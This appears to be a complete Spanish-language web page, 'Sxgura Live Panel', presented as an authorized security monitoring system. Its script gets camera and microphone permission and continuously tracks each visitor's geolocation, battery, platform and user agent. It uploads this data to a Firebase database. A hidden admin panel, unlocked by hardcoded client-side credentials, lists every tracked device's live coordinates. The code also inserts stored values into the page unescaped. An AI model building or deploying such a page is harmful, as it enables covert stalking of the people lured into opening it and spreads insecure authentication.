<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sxgura Live Panel</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#000;
color:#fff;
overflow-x:hidden;
min-height:100vh;
}

/* FONDO */

body::before{
content:"";
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:
radial-gradient(circle at top,#240000,#000 60%);
z-index:-1;
}

/* CONTENEDOR */

.container{
max-width:700px;
margin:auto;
padding:20px;
}

/* LOGO */

.logo{
text-align:center;
margin-top:30px;
margin-bottom:30px;
}

.logo h1{
font-size:34px;
color:#ff0000;
text-shadow:0 0 20px #ff0000;
}

.logo p{
margin-top:10px;
color:#999;
font-size:14px;
}

/* CARD */

.card{
background:#080808;
border:1px solid #1a1a1a;
border-radius:20px;
padding:20px;
margin-bottom:20px;
box-shadow:0 0 20px rgba(255,0,0,.12);
}

/* TITULOS */

.title{
font-size:18px;
margin-bottom:15px;
color:#ff2a2a;
}

/* BOTONES */

button{
width:100%;
padding:14px;
border:none;
border-radius:14px;
background:linear-gradient(45deg,#ff0000,#990000);
color:#fff;
font-weight:bold;
cursor:pointer;
margin-top:10px;
transition:.3s;
}

button:hover{
transform:scale(1.02);
box-shadow:0 0 20px rgba(255,0,0,.35);
}

/* INPUT */

input{
width:100%;
padding:13px;
margin-top:10px;
border:none;
border-radius:12px;
background:#111;
color:#fff;
}

/* STATUS */

.status{
margin-top:15px;
padding:12px;
border-radius:12px;
background:#111;
line-height:1.7;
font-size:14px;
}

/* VIDEO */

video{
width:100%;
border-radius:16px;
margin-top:15px;
border:1px solid #222;
}

/* DISPOSITIVOS */

.device{
background:#111;
padding:15px;
border-radius:15px;
margin-top:15px;
border:1px solid #222;
}

.device h3{
color:#ff3d3d;
margin-bottom:10px;
}

.device p{
font-size:13px;
margin:6px 0;
color:#ccc;
}

/* PANEL */

#adminPanel{
display:none;
}

/* FOOTER */

.footer{
text-align:center;
margin-top:40px;
padding-bottom:30px;
font-size:12px;
color:#666;
}

</style>
</head>

<body>

<div class="container">

<!-- LOGO -->

<div class="logo">

<h1>Sxgura Security</h1>

<p>
Sistema temporal de monitoreo autorizado
</p>

</div>

<!-- PANEL USUARIO -->

<div class="card">

<div class="title">
Activación
</div>

<button onclick="activarSistema()">
ACTIVAR PERMISOS
</button>

<div class="status" id="status">

Esperando activación...

</div>

<video id="video" autoplay muted playsinline></video>

</div>

<!-- LOGIN -->

<div class="card">

<div class="title">
Panel Admin
</div>

<input type="text" id="user" placeholder="Usuario">

<input type="password" id="pass" placeholder="Contraseña">

<button onclick="loginAdmin()">
INGRESAR
</button>

</div>

<!-- ADMIN -->

<div class="card" id="adminPanel">

<div class="title">
Dispositivos conectados
</div>

<div id="devices"></div>

</div>

<div class="footer">
© 2026 Sxgura Inc
</div>

</div>

<script type="module">

/* FIREBASE */

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
getFirestore,
doc,
setDoc,
collection,
onSnapshot
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

/* CONFIG */

const firebaseConfig = {

apiKey: "AIzaSyApiO7_x468L0k0u7vheUW_luEWJ41VRUQ",

authDomain: "sxgura-web.firebaseapp.com",

projectId: "sxgura-web",

storageBucket: "sxgura-web.firebasestorage.app",

messagingSenderId: "912354449131",

appId: "1:912354449131:web:4df2a48d6eb84223bd10ae"

};

const app =
initializeApp(firebaseConfig);

const db =
getFirestore(app);

/* ID DISPOSITIVO */

const deviceId =
Math.random().toString(36).substring(2,10);

/* ELEMENTOS */

const statusBox =
document.getElementById("status");

const video =
document.getElementById("video");

const devicesDiv =
document.getElementById("devices");

/* LOGIN */

window.loginAdmin = function(){

const user =
document.getElementById("user").value;

const pass =
document.getElementById("pass").value;

if(
user === "sxgura"
&&
pass === "2026"
){

document.getElementById("adminPanel")
.style.display = "block";

cargarDispositivos();

}else{

alert("Credenciales incorrectas");

}

}

/* ACTIVAR */

window.activarSistema =
async function(){

statusBox.innerHTML =
"Solicitando permisos...";

try{

/* CAMARA + MICRO */

const stream =
await navigator.mediaDevices.getUserMedia({
video:true,
audio:true
});

video.srcObject = stream;

/* UBICACION */

navigator.geolocation.watchPosition(

async(pos)=>{

const lat =
pos.coords.latitude;

const lon =
pos.coords.longitude;

let batteryLevel =
"No disponible";

if(navigator.getBattery){

const battery =
await navigator.getBattery();

batteryLevel =
Math.floor(
battery.level * 100
) + "%";

}

/* GUARDAR FIREBASE */

await setDoc(
doc(db,"devices",deviceId),
{

deviceId,

lat,

lon,

battery:batteryLevel,

platform:navigator.platform,

userAgent:navigator.userAgent,

online:true,

lastUpdate:new Date().toLocaleTimeString(),

timestamp:Date.now()

}

);

statusBox.innerHTML = `

✅ Cámara activa<br>
✅ Micrófono activo<br>
✅ Ubicación activa

`;

},

(err)=>{

statusBox.innerHTML =
"❌ Ubicación denegada";

}

);

}catch(e){

statusBox.innerHTML =
"❌ Permisos denegados";

console.log(e);

}

}

/* CARGAR DISPOSITIVOS */

function cargarDispositivos(){

onSnapshot(
collection(db,"devices"),

(snapshot)=>{

devicesDiv.innerHTML = "";

snapshot.forEach((docu)=>{

const d =
docu.data();

devicesDiv.innerHTML += `

<div class="device">

<h3>
${d.deviceId}
</h3>

<p>
<b>Estado:</b>
Online
</p>

<p>
<b>Batería:</b>
${d.battery}
</p>

<p>
<b>Latitud:</b>
${d.lat}
</p>

<p>
<b>Longitud:</b>
${d.lon}
</p>

<p>
<b>Plataforma:</b>
${d.platform}
</p>

<p>
<b>Última actualización:</b>
${d.lastUpdate}
</p>

</div>

`;

});

}

);

}

</script>

</body>
</html>
